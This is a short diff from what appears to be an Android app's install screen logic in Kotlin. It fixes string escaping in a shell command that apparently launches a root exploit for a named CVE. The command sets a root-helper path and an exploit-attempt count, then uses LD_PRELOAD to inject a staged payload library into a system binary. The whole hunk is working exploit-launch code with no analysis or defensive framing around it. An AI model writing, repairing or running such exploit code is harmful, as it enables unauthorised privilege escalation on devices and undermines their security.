@@ -206,7 +206,7 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
                 arrayOf(
                     "/system/bin/sh",
                     "-c",
-                    "i=0; while [ $i -lt 400 ]; do /system/bin/true; i=$((i+1)); done; CVE43499_ROOT_HELPER=${shellQuote(helper.absolutePath)} EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS LD_PRELOAD=${shellQuote(stagedPayload.absolutePath)} /system/bin/true 2>&1",
+                    "i=0; while [ ${'$'}i -lt 400 ]; do /system/bin/true; i=$((i+1)); done; CVE43499_ROOT_HELPER=${shellQuote(helper.absolutePath)} EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS LD_PRELOAD=${shellQuote(stagedPayload.absolutePath)} /system/bin/true 2>&1",
                 ),
                 emptyArray(),
             )
